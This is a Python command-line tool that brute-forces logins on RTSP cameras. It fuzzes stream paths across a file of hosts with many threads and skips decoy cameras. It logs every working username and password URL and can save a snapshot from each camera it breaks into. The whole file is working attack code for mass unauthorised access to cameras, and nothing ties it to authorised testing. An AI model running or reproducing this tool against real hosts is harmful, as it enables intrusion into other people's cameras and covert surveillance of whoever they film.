#!/usr/bin/env python
"""Brute creds, fuzzing paths for RTSP cams.
See --help for options."""
import os
import sys

from fire import Fire

from lib.rtsp import capture_image, rtsp_req
from lib.scan import process_each
from lib.utils import dt, str_to_filename, tmof_retry, interruptable

verbose_level = 0

FAKE_CAM_DETECT = '/0h84d'

# RTSP (my) client status codes
CODE_SUCCESS = 200
CODE_UNAUTHORIZED = 401
CODE_FAIL = 500
CODES_INTERESTING = [200, 401, 403]

C_CAM_FOUND = '@'
C_CAM_FAKE = '~'
C_CAM_FAIL = '-'
C_CAP_OK = 'C'
C_CAP_ERR = '!'

# directories to work with
DIR = os.path.dirname(os.path.abspath(__file__))
LOCAL_DIR = os.path.join(DIR, 'local')
DATA_DIR = os.path.join(DIR, 'data')
CAPTURES_DIR = os.path.join(LOCAL_DIR, 'rtsp_captures')


def prg(t, level=0):
    if verbose_level >= level:
        sys.stdout.write(t)
        sys.stdout.flush()


@tmof_retry
def wrire_result(stream_url: str):
    with open(os.path.join(LOCAL_DIR, 'rtsp.txt'), 'a') as f:
        f.write(f'[{dt()}] {stream_url}\n')


@interruptable
@tmof_retry
def capture(stream_url, prefer_ffmpeg=False):
    from urllib.parse import urlparse

    up = urlparse(stream_url)
    p = str_to_filename(f'{up.path}{up.params}')

    img_name = f'{up.hostname}_{up.port}_{up.username}_{up.password}_{p}'
    img_path = os.path.join(CAPTURES_DIR, f'{img_name}.jpg')

    captured = capture_image(stream_url, img_path, prefer_ffmpeg)

    prg(C_CAP_OK if captured else C_CAP_ERR)


@interruptable
def check_host(netloc, pl, paths, creds, rtsp_port, timeout, single_path_enough, single_cred_enough, interface, capture_img, prefer_ffmpeg):
    # test some cases that cannot be valid as netloc
    if '/' in netloc:
        print('Can\'t use', netloc, 'as target')
        return

    # no port in host string, adding
    if ':' not in netloc:
        netloc = f'{netloc}:{rtsp_port}'

    for path in paths:
        p_url = f'rtsp://{netloc}{path}'

        code = rtsp_req(p_url, timeout, interface)

        if code >= CODE_FAIL:
            prg(C_CAM_FAIL)
            return

        # path has no critical error
        # but is not ok & not have auth restrictions
        if code not in CODES_INTERESTING:
            prg('.', 1)
            continue

        # path exists, but no cams can have that path in real world
        if path == FAKE_CAM_DETECT:
            prg(C_CAM_FAKE)
            return

        if code > 400:
            prg(str(code)[2])

        # path exists (in CODES_INTERESTING) & not fake
        # will try to check creds
        for cred in creds:
            c_url = f'rtsp://{cred}@{netloc}{path}'
            code = rtsp_req(c_url, timeout, interface)

            if code >= CODE_FAIL:
                prg(C_CAM_FAIL)
                return []

            if code != CODE_SUCCESS:
                continue

            prg(C_CAM_FOUND)

            with pl:
                wrire_result(c_url)
                if verbose_level < 0:
                    print(c_url)
                if capture_img:
                    capture(c_url, prefer_ffmpeg)

            if single_cred_enough:
                break

        if single_path_enough:
            return


def main(hosts_file=None, p=554, t=5, ht=64, i=None, capture=False, v=0, s=False, P=None, C=None, sp=False, sc=True, ff=False):
    """Brute creds, fuzzing paths for RTSP cams

    :param str hosts_file: File with lines ip:port or just ips
    :param int p: Default port to use if not specified in file
    :param float t: Timeout for queries
    :param str i: Network interface to use
    :param int ht: Threads count for hosts
    :param bool capture: Capture images
    :param int v: Verbose level
    :param bool s: Silent mode
    :param str P: paths file
    :param str C: creds file
    :param bool sp: end process host after single successful path
    :param bool sc: end process path after single successful cred
    :param bool ff: prefer ffmpeg over opencv
    """
    global verbose_level

    verbose_level = v

    if s:
        verbose_level = -1

    if capture and not os.path.exists(CAPTURES_DIR):
        os.mkdir(CAPTURES_DIR)

    with open(P or os.path.join(DATA_DIR, 'rtsp_paths.txt')) as f:
        paths = [FAKE_CAM_DETECT] + [ln.rstrip() for ln in f]

    with open(C or os.path.join(DATA_DIR, 'rtsp_creds.txt')) as f:
        creds = [ln.rstrip() for ln in f]

    with open(hosts_file or os.path.join(LOCAL_DIR, f'hosts_{p}.txt')) as f:
        hosts = (ln.rstrip() for ln in f)
        process_each(check_host, hosts, ht, paths,
                     creds, p, t, sp, sc, i, capture, ff)


if __name__ == "__main__":
    Fire(main)
